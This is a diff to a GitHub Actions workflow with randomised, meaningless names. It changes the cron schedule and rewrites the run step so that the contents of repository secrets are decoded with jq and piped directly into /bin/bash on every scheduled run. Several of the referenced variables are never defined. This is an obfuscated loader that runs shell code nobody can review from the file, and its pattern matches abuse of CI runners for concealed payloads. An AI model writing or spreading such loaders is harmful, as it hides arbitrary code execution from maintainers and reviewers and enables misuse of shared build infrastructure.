@@ -3,7 +3,7 @@ name: kuanghengj
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '56 4/6 * * *'
 
 jobs:
   build:
@@ -13,16 +13,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: kuanghengj
         env:
-          tg0819: ${{ secrets.tg0819 }}
+          wigco70: ${{ secrets.wigco70 }}
         run: |
-          echo $tg0819 | jq -r .v0 | /bin/bash
-          echo $n64676 | jq -r .mxo27 | /bin/bash
-          echo $dqmjy85 | jq -r .f45330 | /bin/bash
-          echo $jte700 | jq -r .xoynz39927 | /bin/bash
-          echo $nzfhq72670 | jq -r .cf85 | /bin/bash
-          echo $pw360 | jq -r .uxpy73656 | /bin/bash
-          echo $vnxs14114 | jq -r .fz46439 | /bin/bash
-          echo $dbzg90 | jq -r .rynd475 | /bin/bash
-          echo $y45 | jq -r .xrof908 | /bin/bash
-          echo $yi563 | jq -r .j0509 | /bin/bash
+          echo $wigco70 | jq -r .l45477 | /bin/bash
+          echo $g086 | jq -r .a05300 | /bin/bash
+          echo $yip468 | jq -r .qd6868 | /bin/bash
+          echo $gm2898 | jq -r .nicg412 | /bin/bash
 
